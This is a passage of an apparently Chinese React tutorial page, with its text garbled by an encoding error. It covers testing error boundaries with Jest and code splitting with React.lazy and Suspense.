ç±»ä¼¼èƒ½åŠ›</li></ul><p><strong>Qï¼šå¦‚ä½•åœ¨å‡½æ•°ç»„ä»¶ä¸­å®ç°ç±»ä¼¼é”™è¯¯è¾¹ç•Œçš„åŠŸèƒ½ï¼Ÿ</strong></p><ul><li>ä½¿ç”¨ç±»ç»„ä»¶åŒ…è£…ï¼šåˆ›å»ºé”™è¯¯è¾¹ç•Œç±»ç»„ä»¶åŒ…è£¹å‡½æ•°ç»„ä»¶</li><li>è‡ªå®šä¹‰Hookï¼šä½¿ç”¨ useErrorBoundary Hook æ‰‹åŠ¨æ•è·é”™è¯¯</li><li>ç¬¬ä¸‰æ–¹åº“ï¼šä½¿ç”¨ react-error-boundary åº“çš„ useErrorBoundary Hook</li><li>é”™è¯¯ä¼ æ’­ï¼šåœ¨å‡½æ•°ç»„ä»¶ä¸­æŠ›å‡ºé”™è¯¯è®©çˆ¶çº§é”™è¯¯è¾¹ç•Œæ•è·</li></ul><p><strong>Qï¼šå¦‚ä½•æµ‹è¯•é”™è¯¯è¾¹ç•Œç»„ä»¶ï¼Ÿ</strong></p><p>æµ‹è¯•ç­–ç•¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ Jest å’Œ React Testing Library</span><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;æ•è·é”™è¯¯å¹¶æ˜¾ç¤ºé™çº§UI&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// åˆ›å»ºæŠ›å‡ºé”™è¯¯çš„ç»„ä»¶</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">ErrorComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;æµ‹è¯•é”™è¯¯&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> &#123; getByText &#125; = <span class="hljs-title function_">render</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">div</span>&gt;</span>é”™è¯¯æ•è·<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>  <br>  <span class="hljs-title function_">expect</span>(<span class="hljs-title function_">getByText</span>(<span class="hljs-string">&#x27;é”™è¯¯æ•è·&#x27;</span>)).<span class="hljs-title function_">toBeInTheDocument</span>();<br>&#125;);<br><br><span class="hljs-comment">// æµ‹è¯•é”™è¯¯æ—¥å¿—</span><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;è®°å½•é”™è¯¯åˆ°ç›‘æ§ç³»ç»Ÿ&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> mockErrorLogger = jest.<span class="hljs-title function_">fn</span>();<br>  <span class="hljs-keyword">const</span> error = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;æµ‹è¯•é”™è¯¯&#x27;</span>);<br>  <br>  <span class="hljs-title function_">render</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">onError</span>=<span class="hljs-string">&#123;mockErrorLogger&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>  <br>  <span class="hljs-title function_">expect</span>(mockErrorLogger).<span class="hljs-title function_">toHaveBeenCalledWith</span>(<br>    error,<br>    expect.<span class="hljs-title function_">objectContaining</span>(&#123;<br>      <span class="hljs-attr">componentStack</span>: expect.<span class="hljs-title function_">any</span>(<span class="hljs-title class_">String</span>)<br>    &#125;)<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>æ ¸å¿ƒåŠŸèƒ½ï¼š<ul><li>æ•è·å­ç»„ä»¶æ ‘ä¸­çš„æ¸²æŸ“é”™è¯¯</li><li>å±•ç¤ºé™çº§UIæ›¿ä»£å´©æºƒç•Œé¢</li><li>è®°å½•é”™è¯¯ä¿¡æ¯ç”¨äºåˆ†æ</li></ul></li><li>å®ç°å…³é”®ï¼š<ul><li>getDerivedStateFromError è®¾ç½®é”™è¯¯çŠ¶æ€</li><li>componentDidCatch è®°å½•é”™è¯¯ä¿¡æ¯</li><li>ç±»ç»„ä»¶ä¸“å±å®ç°</li></ul></li><li>æœ€ä½³å®è·µï¼š<ul><li>åˆ†å±‚é”™è¯¯è¾¹ç•Œç­–ç•¥</li><li>ç”Ÿäº§ç¯å¢ƒä¸“ç”¨å¤„ç†</li><li>ä¸SuspenseååŒä½¿ç”¨</li><li>å®Œå–„çš„é”™è¯¯æ—¥å¿—è®°å½•</li></ul></li><li>React 18 å¢å¼ºï¼š<ul><li>ä¸å¹¶å‘æ¸²æŸ“å…¼å®¹</li><li>ä¸Suspenseæ·±åº¦é›†æˆ</li><li>æ›´ç²¾ç»†çš„é”™è¯¯å¤„ç†æ§åˆ¶</li></ul></li><li>é¢è¯•é‡ç‚¹ï¼š<ul><li>é”™è¯¯è¾¹ç•Œçš„æ•è·èŒƒå›´</li><li>ç±»ç»„ä»¶çš„å¿…è¦æ€§</li><li>å‡½æ•°ç»„ä»¶çš„æ›¿ä»£æ–¹æ¡ˆ</li><li>æµ‹è¯•ç­–ç•¥ä¸æ–¹æ³•</li></ul></li></ul><h2 id="4-3-ä»£ç åˆ†å‰²ä¸æ‡’åŠ è½½ï¼ˆReact-lazy-Suspenseï¼‰"><a href="#4-3-ä»£ç åˆ†å‰²ä¸æ‡’åŠ è½½ï¼ˆReact-lazy-Suspenseï¼‰" class="headerlink" title="4.3 ä»£ç åˆ†å‰²ä¸æ‡’åŠ è½½ï¼ˆReact.lazy + Suspenseï¼‰"></a>4.3 ä»£ç åˆ†å‰²ä¸æ‡’åŠ è½½ï¼ˆReact.lazy + Suspenseï¼‰</h2><h3 id="ä»£ç åˆ†å‰²æ ¸å¿ƒæ¦‚å¿µ"><a href="#ä»£ç åˆ†å‰²æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="ä»£ç åˆ†å‰²æ ¸å¿ƒæ¦‚å¿µ"></a>ä»£ç åˆ†å‰²æ ¸å¿ƒæ¦‚å¿µ</h3><p><strong>é—®é¢˜èƒŒæ™¯ï¼šä¼ ç»Ÿæ‰“åŒ…ç—›ç‚¹</strong></p><pre class="mermaid">graph TD    A[å•å…¥å£æ‰“åŒ…] --> B[å·¨å¤§çš„ bundle æ–‡ä»¶]    B --> C[é¦–å±åŠ è½½ç¼“æ…¢]    B --> D[èµ„æºæµªè´¹]    B --> E[ç”¨æˆ·ä½“éªŒå·®]</pre><p><strong>ä»£ç åˆ†å‰²æ ¸å¿ƒä»·å€¼</strong></p><table><thead><tr><th align="left">ä¼˜åŒ–æ–¹å‘</th><th align="left">å®ç°æ•ˆæœ</th><th align="left">æŠ€æœ¯æ‰‹æ®µ</th></tr></thead><tbody><tr><td align="left">é¦–å±åŠ è½½</td><td align="left">å‡å°‘åˆå§‹åŠ è½½ä½“ç§¯</td><td align="left">è·¯ç”±çº§åˆ†å‰²</td></tr><tr><td align="left">æŒ‰éœ€åŠ è½½</td><td align="left">ä½¿ç”¨æ—¶æ‰åŠ è½½èµ„æº</td><td align="left">ç»„ä»¶çº§æ‡’åŠ è½½</td></tr><tr><td align="left">ç¼“å­˜ä¼˜åŒ–</td><td align="left">æ›´ç»†ç²’åº¦ç¼“å­˜æ§åˆ¶</td><td align="left">æ¨¡å—åˆ†ç¦»</td></tr><tr><td align="left">å¹¶è¡ŒåŠ è½½</td><td align="left">åˆ©ç”¨æµè§ˆå™¨å¹¶å‘èƒ½åŠ›</td><td align="left">å¤š chunk å¹¶è¡Œ</td></tr></tbody></table><h3 id="åŸºç¡€å®ç°æ–¹æ¡ˆ"><a href="#åŸºç¡€å®ç°æ–¹æ¡ˆ" class="headerlink" title="åŸºç¡€å®ç°æ–¹æ¡ˆ"></a>åŸºç¡€å®ç°æ–¹æ¡ˆ</h3><p><strong>Webpack åŠ¨æ€å¯¼å…¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥è¯­æ³•</span><br><span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./math&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">math</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">16</span>, <span class="hljs-number">26</span>));<br>&#125;);<br><br><span class="hljs-comment">// React ç»„ä»¶åŠ¨æ€å¯¼å…¥</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductModal</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductModal&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>React.lazy åŸºç¡€ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">HomePage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/HomePage&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AboutPage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/AboutPage&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ContactPage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/ContactPage&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">HomePage</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">AboutPage</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/contact&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ContactPage</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Suspense æ ¸å¿ƒæœºåˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserDashboard</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">CardSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">RecentActivities</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ChartPlaceholder</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">PerformanceChart</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// åµŒå¥— Suspense ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">FullPageSpinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ContentLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">              &#123;/* è·¯ç”±é…ç½® */&#125;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;null&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">LiveChatWidget</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜çº§ä¼˜åŒ–ç­–ç•¥"><a href="#é«˜çº§ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="é«˜çº§ä¼˜åŒ–ç­–ç•¥"></a>é«˜çº§ä¼˜åŒ–ç­–ç•¥</h3><p><strong>è·¯ç”±çº§ä»£ç åˆ†å‰²</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±é…ç½®æ–‡ä»¶</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">PageLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">HomePage</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>    )<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">DashboardLayout</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>    ),<br>    <span class="hljs-attr">children</span>: [<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;analytics&#x27;</span>,<br>        <span class="hljs-attr">element</span>: (<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ChartLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AnalyticsPage</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>        )<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;settings&#x27;</span>,<br>        <span class="hljs-attr">element</span>: (<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">SettingsPlaceholder</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">SettingsPage</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>        )<br>      &#125;<br>    ]<br>  &#125;<br>];<br></code></pre></td></tr></table></figure><p><strong>ç»„ä»¶çº§æ‡’åŠ è½½</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductGallery</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductGallery&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductReviews</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductReviews&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RelatedProducts</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./RelatedProducts&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductDetailPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [activeTab, setActiveTab] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;gallery&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;/* æ ‡ç­¾åˆ‡æ¢ */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Tabs</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setActiveTab&#125;</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;tab-content&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;activeTab === &#x27;gallery&#x27; &amp;&amp; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ImageGridSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProductGallery</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">        </span><br><span class="language-xml">        &#123;activeTab === &#x27;reviews&#x27; &amp;&amp; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ReviewListSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProductReviews</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">        </span><br><span class="language-xml">        &#123;activeTab === &#x27;related&#x27; &amp;&amp; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProductCardSkeleton</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;3&#125;</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">RelatedProducts</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é¢„åŠ è½½ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 